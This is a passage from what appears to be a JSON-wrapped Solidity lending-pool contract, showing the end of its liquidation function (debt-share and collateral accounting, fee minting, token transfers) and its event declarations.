1e18; // rounds down\n            _shares = tokenToShares(_amount, _currentTotalDebt, _debtSharesSupply, false);\n        }\n        _currentTotalDebt -= _amount;\n\n        // commit current state\n        debtSharesBalanceOf[_borrower] -= _shares;\n        debtSharesSupply = _debtSharesSupply - _shares;\n        collateralBalanceOf[_borrower] = collateralBalance - collateralReward;\n        totalSupply = _currentTotalSupply;\n        lastTotalDebt = _currentTotalDebt;\n        lastAccrueInterestTime = block.timestamp;\n        lastCollateralRatioMantissa = _currentCollateralRatioMantissa;\n        emit Liquidate(_borrower, _amount, collateralReward);\n        if(_accruedFeeShares > 0) {\n            address __feeRecipient = _feeRecipient; // avoid stack too deep\n            balanceOf[__feeRecipient] += _accruedFeeShares;\n            emit Transfer(address(0), __feeRecipient, _accruedFeeShares);\n        }\n\n        // interactions\n        safeTransferFrom(LOAN_TOKEN, msg.sender, address(this), _amount);\n        safeTransfer(COLLATERAL_TOKEN, msg.sender, collateralReward);\n    }\n\n    event Transfer(address indexed from, address indexed to, uint value);\n    event Approval(address indexed owner, address indexed spender, uint value);\n    event Invest(address indexed user, uint amount);\n    event Divest(address indexed user, uint amount);\n    event Borrow(address indexed user, uint amount);\n    event Repay(address indexed user, address indexed caller, uint amount);\n    event Liquidate(address indexed user, uint amount, uint collateralReward);\n    event Secure(address indexed user, address indexed caller, uint amount);\n    event Unsecure(address indexed user, uint amount);\n}"
    }
  ]
}